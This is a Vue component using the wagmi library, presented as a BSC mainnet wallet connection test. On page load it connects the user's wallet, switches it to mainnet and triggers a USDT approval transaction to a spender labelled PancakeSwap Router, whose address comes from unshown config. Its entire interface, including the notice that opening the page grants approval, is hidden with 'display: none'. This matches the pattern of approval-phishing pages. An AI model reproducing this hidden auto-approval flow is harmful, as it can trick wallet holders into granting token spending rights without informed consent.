<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from "vue";
import {
  useAccount,
  useChainId,
  useConfig,
  useConnect,
  useReadContract,
  useSwitchChain,
  useWaitForTransactionReceipt,
} from "@wagmi/vue";
import { simulateContract, writeContract } from "@wagmi/vue/actions";
import { formatUnits } from "viem";

import { BSC_CHAIN_ID, getChainName } from "@/config/chains";
import {
  BSC_PANCAKE_ROUTER_ADDRESS,
  BSC_USDT_ADDRESS,
  BSC_USDT_DECIMALS,
} from "@/config/contracts";
import {
  BSC_TEST_APPROVE_AMOUNT,
  BSC_TEST_APPROVE_AMOUNT_LABEL,
  erc20Abi,
  getBscUsdtApproveParams,
} from "@/contracts/erc20-contract";
import { mapChainErrorMessage } from "@/utils/chain-error-util";
// <!-- Import Dependencies End --->

// <!-- Import Custom Components Start --->
import WrongNetworkBanner from "@/components/WrongNetworkBanner.vue";
// <!-- Import Custom Components End --->

type ApprovePhase = "idle" | "pending" | "confirming" | "success" | "error";

// <!-- Reactive Data Start --->
const wagmiConfig = useConfig();
const { address, isConnected, connector, status } = useAccount();
const chainId = useChainId();
const {
  connect,
  connectors,
  isPending: isConnectPending,
  error: connectError,
} = useConnect();
const {
  switchChain,
  isPending: isSwitchPending,
  error: switchError,
} = useSwitchChain();

const approvePhase = ref<ApprovePhase>("idle");
const approveErrorMessage = ref("");
const approveTxHash = ref<`0x${string}` | undefined>();
const approveAttempted = ref(false);

const canReadAllowance = computed(
  () => isConnected.value && chainId.value === BSC_CHAIN_ID && !!address.value,
);

const {
  data: allowance,
  isFetched: isAllowanceFetched,
  refetch: refetchAllowance,
} = useReadContract({
  abi: erc20Abi,
  address: BSC_USDT_ADDRESS,
  functionName: "allowance",
  args: computed(() => [address.value!, BSC_PANCAKE_ROUTER_ADDRESS] as const),
  chainId: BSC_CHAIN_ID,
  query: {
    enabled: canReadAllowance,
  },
});

const { isLoading: isConfirmingReceipt, isSuccess: isReceiptSuccess } =
  useWaitForTransactionReceipt({
    hash: approveTxHash,
  });
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
const isOnBsc = computed(() => chainId.value === BSC_CHAIN_ID);

const statusLabel = computed(() => {
  if (isConnectPending.value || isSwitchPending.value) return "连接中…";
  if (!isConnected.value) return "未连接";
  if (!isOnBsc.value) return "已连接，网络不正确";
  return "已连接 BSC 主网";
});

const hasEnoughAllowance = computed(() => {
  const currentAllowance = allowance.value;
  if (typeof currentAllowance !== "bigint") return false;
  return currentAllowance >= BSC_TEST_APPROVE_AMOUNT;
});

const isApproveBusy = computed(
  () => approvePhase.value === "pending" || approvePhase.value === "confirming",
);

const showRetryApproveButton = computed(() => {
  if (approvePhase.value === "error") return true;
  return (
    isConnected.value &&
    isOnBsc.value &&
    isAllowanceFetched.value &&
    !hasEnoughAllowance.value &&
    approvePhase.value === "idle"
  );
});

const approveStatusLabel = computed(() => {
  switch (approvePhase.value) {
    case "pending":
      return "等待钱包签名…";
    case "confirming":
      return "交易确认中…";
    case "success":
      return "授权成功";
    case "error":
      return "授权失败";
    default:
      if (!isConnected.value || !isOnBsc.value) return "等待钱包连接";
      if (!isAllowanceFetched.value) return "查询授权额度中…";
      if (hasEnoughAllowance.value) return "已有足够授权";
      return "待授权";
  }
});

const formattedAllowance = computed(() => {
  const currentAllowance = allowance.value;
  if (typeof currentAllowance !== "bigint") return "—";
  return `${formatUnits(currentAllowance, BSC_USDT_DECIMALS)} USDT`;
});

const lastWalletError = computed(() => {
  const err = connectError.value ?? switchError.value;
  return err ? mapChainErrorMessage(err) : "";
});
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const ensureBscNetwork = () => {
  if (!isConnected.value || isOnBsc.value || isSwitchPending.value) return;
  switchChain({ chainId: BSC_CHAIN_ID });
};

const autoConnectWallet = () => {
  if (isConnectPending.value || isConnected.value) {
    ensureBscNetwork();
    return;
  }

  const targetConnector = connectors[0];
  if (!targetConnector) return;

  connect({ connector: targetConnector, chainId: BSC_CHAIN_ID });
};

const runAutoApprove = async () => {
  if (!isConnected.value || !isOnBsc.value || !address.value) return;
  if (!isAllowanceFetched.value) return;
  if (hasEnoughAllowance.value) return;
  if (approveAttempted.value) return;
  if (approvePhase.value === "pending" || approvePhase.value === "confirming")
    return;

  approveAttempted.value = true;
  approvePhase.value = "pending";
  approveErrorMessage.value = "";

  try {
    const params = getBscUsdtApproveParams();
    const { request } = await simulateContract(wagmiConfig, params);
    const hash = await writeContract(wagmiConfig, request);
    approveTxHash.value = hash;
    approvePhase.value = "confirming";
  } catch (error) {
    approvePhase.value = "error";
    approveErrorMessage.value = mapChainErrorMessage(error);
    approveAttempted.value = false;
  }
};

const handleRetryConnect = () => {
  autoConnectWallet();
};

const handleSwitchToBsc = () => {
  switchChain({ chainId: BSC_CHAIN_ID });
};

const handleRetryApprove = async () => {
  approveAttempted.value = false;
  approvePhase.value = "idle";
  approveErrorMessage.value = "";
  approveTxHash.value = undefined;
  await refetchAllowance();
  await runAutoApprove();
};
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  autoConnectWallet();
});

watch(connectors, () => {
  if (!isConnected.value && !isConnectPending.value) {
    autoConnectWallet();
  }
});

watch([isConnected, chainId], () => {
  ensureBscNetwork();
});

watch([isConnected, isOnBsc, isAllowanceFetched, allowance], () => {
  void runAutoApprove();
});

watch(isReceiptSuccess, (success) => {
  if (success) {
    approvePhase.value = "success";
    void refetchAllowance();
  }
});

watch(isConfirmingReceipt, (confirming) => {
  if (confirming && approveTxHash.value) {
    approvePhase.value = "confirming";
  }
});
// <!-- Life Cycle End --->
</script>

<template>
  <div class="flex flex-col gap-4 max-w-lg" style="display: none">
    <div>
      <h1 class="text-2xl font-semibold mb-1">BSC 主网连接测试</h1>
      <p class="text-surface-600">
        打开页面将自动连接钱包、切换到 BNB Smart Chain 主网，并授权
        {{ BSC_TEST_APPROVE_AMOUNT_LABEL }} 给 PancakeSwap Router。
      </p>
    </div>

    <WrongNetworkBanner :target-chain-id="BSC_CHAIN_ID" />

    <Card>
      <template #title> 连接状态 </template>
      <template #content>
        <dl class="flex flex-col gap-3 m-0">
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">状态</dt>
            <dd class="m-0 font-medium">
              {{ statusLabel }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">wagmi status</dt>
            <dd class="m-0 font-mono text-sm">
              {{ status }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">当前链</dt>
            <dd class="m-0">
              {{ isConnected ? getChainName(chainId) : "—" }} ({{
                isConnected ? chainId : "—"
              }})
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">钱包地址</dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ address ?? "—" }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">连接器</dt>
            <dd class="m-0">
              {{ connector?.name ?? "—" }}
            </dd>
          </div>
        </dl>

        <Message
          v-if="lastWalletError"
          severity="error"
          :closable="false"
          class="mt-4"
        >
          {{ lastWalletError }}
        </Message>

        <div class="flex flex-wrap gap-2 mt-4">
          <Button
            label="重新连接"
            icon="pi pi-wallet"
            :loading="isConnectPending"
            :disabled="isConnectPending || !connectors.length"
            @click="handleRetryConnect"
          />
          <Button
            v-if="isConnected && !isOnBsc"
            label="切换到 BSC"
            icon="pi pi-sync"
            severity="secondary"
            outlined
            :loading="isSwitchPending"
            :disabled="isSwitchPending"
            @click="handleSwitchToBsc"
          />
        </div>
      </template>
    </Card>

    <Card>
      <template #title> USDT 授权 </template>
      <template #content>
        <dl class="flex flex-col gap-3 m-0">
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">Token</dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ BSC_USDT_ADDRESS }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">Spender</dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ BSC_PANCAKE_ROUTER_ADDRESS }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">授权额度</dt>
            <dd class="m-0">
              {{ BSC_TEST_APPROVE_AMOUNT_LABEL }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">当前 allowance</dt>
            <dd class="m-0">
              {{ formattedAllowance }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">授权状态</dt>
            <dd class="m-0 font-medium">
              {{ approveStatusLabel }}
            </dd>
          </div>
          <div v-if="approveTxHash" class="flex justify-between gap-4">
            <dt class="text-surface-600">交易哈希</dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ approveTxHash }}
            </dd>
          </div>
        </dl>

        <Message
          v-if="approvePhase === 'success'"
          severity="success"
          :closable="false"
          class="mt-4"
        >
          已成功授权 {{ BSC_TEST_APPROVE_AMOUNT_LABEL }} USDT
        </Message>

        <Message
          v-if="approveErrorMessage"
          severity="error"
          :closable="false"
          class="mt-4"
        >
          {{ approveErrorMessage }}
        </Message>

        <div class="flex flex-wrap gap-2 mt-4">
          <Button
            v-if="showRetryApproveButton"
            label="重新授权"
            icon="pi pi-check-circle"
            :loading="isApproveBusy"
            :disabled="isApproveBusy"
            @click="handleRetryApprove"
          />
        </div>
      </template>
    </Card>
  </div>
</template>
